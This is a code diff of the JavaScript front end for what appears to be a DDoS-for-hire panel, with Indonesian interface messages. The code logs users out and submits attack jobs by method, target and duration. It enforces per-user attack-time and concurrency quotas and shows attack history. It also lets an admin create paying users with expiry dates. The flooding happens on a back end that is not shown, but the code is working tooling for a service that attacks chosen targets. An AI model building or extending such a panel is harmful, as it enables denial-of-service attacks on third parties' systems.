     function logout() {
       currentUser = null;
-      showPage('login');
-      document.getElementById("nav").classList.add("hidden");
-      document.querySelectorAll(".admin-only").forEach(el => el.style.display = 'none');
+      activeAttacks = [];
+      stopActiveUsersPolling();
+      if (cooldownInterval) clearInterval(cooldownInterval);
+      showPage("login");
+      document.getElementById("loginUser").value = "";
+      document.getElementById("loginPass").value = "";
     }
 
-    function sendAttack() {
-      const method = document.getElementById("method").value;
-      const target = document.getElementById("target").value;
-      const duration = parseInt(document.getElementById("duration").value);
-
-      if (!currentUser) return alert("Not logged in");
-      if (duration > currentUser.timeLimit) return alert("Melebihi time limit kamu");
-      
-      fetch(API_URL + "/history?username=" + currentUser.username)
-        .then(res => res.json())
-        .then(history => {
-          const ongoing = history.length;
-          if (ongoing >= currentUser.conc) return alert("Kamu sudah mencapai limit concurrent!");
-
-          fetch(API_URL + "/history", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              username: currentUser.username,
-              attack: { method, target, duration }
-            })
-          }).then(res => res.json())
-            .then(data => {
-              if (data.success) {
-                alert("Attack sent!");
-                loadHistory();
-              } else {
-                alert("Gagal mengirim attack");
-              }
-            });
-        });
-    }
-
-    function loadHistory() {
-      if (!currentUser) return;
-      fetch(API_URL + "/history?username=" + currentUser.username)
-        .then(res => res.json())
-        .then(history => {
-          const list = document.getElementById("history-list");
-          list.innerHTML = "";
-          history.forEach(h => {
-            const li = document.createElement("li");
-            li.innerText = `${h.time} - ${h.method} to ${h.target} (${h.duration}s)`;
-            list.appendChild(li);
-          });
-        });
-    }
-
-    function addUser() {
-      const newUser = {
-        username: document.getElementById("new-username").value,
-        password: document.getElementById("new-password").value,
-        conc: parseInt(document.getElementById("new-conc").value),
-        timeLimit: parseInt(document.getElementById("new-time").value),
-        expiry: document.getElementById("new-expiry").value,
-        isAdmin: document.getElementById("new-admin").value === "true",
-        history: []
-      };
-
-      fetch(API_URL + "/add-user", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(newUser)
-      }).then(res => res.json())
-        .then(data => {
-          if (data.success) alert("User berhasil ditambahkan!");
-          else alert(data.error);
-        });
-    }
-
-    function signupPrompt() {
-      const username = prompt("Username:");
-      const password = prompt("Password:");
-      const captcha = prompt("Berapa 5 + 3?");
-
-      if (captcha !== "8") return alert("Captcha salah");
-
-      const user = {
-        username,
-        password,
-        conc: 0,
-        timeLimit: 0,
-        expiry: new Date().toISOString().split('T')[0],
-        isAdmin: false,
-        history: []
-      };
-
-      fetch(API_URL + "/add-user", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(user)
-      }).then(res => res.json())
-        .then(data => {
-          if (data.success) alert("Berhasil daftar, tunggu aktivasi admin.");
-          else alert(data.error);
-        });
-    }
-
-    // Start di login page
-    showPage('login');
+    // Initialize
+    document.getElementById("method").addEventListener("change", updateMethodDescription);
+    updateMethods();
   </script>
 </body>
 </html>
